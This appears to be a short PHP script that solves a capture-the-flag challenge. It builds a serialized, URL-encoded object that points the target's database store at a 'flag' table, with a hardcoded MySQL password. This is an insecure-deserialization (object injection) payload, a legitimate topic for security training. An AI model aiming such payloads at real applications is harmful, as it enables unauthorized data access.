<?php
class MysqlRecordStore 
{
    private $mysqli;
    private $table;
    private $host;
    private $user;
    private $pass;
    private $db;

    public function __construct($host, $user, $pass, $db, $table) {
        $this->host = $host;
        $this->user = $user;
        $this->pass = $pass;
        $this->db = $db;
        $this->table = $table;
    }
}

class Albums {
    private $store;

    public function __construct($store) {
        $this->store = $store;
    }
}

$a = new Albums(new MysqlRecordStore('mysql', 'user', 'j90dsgjdjds09djvupx', 'challenge', 'flag'));
$b = urlencode(serialize($a));
echo $b;

?>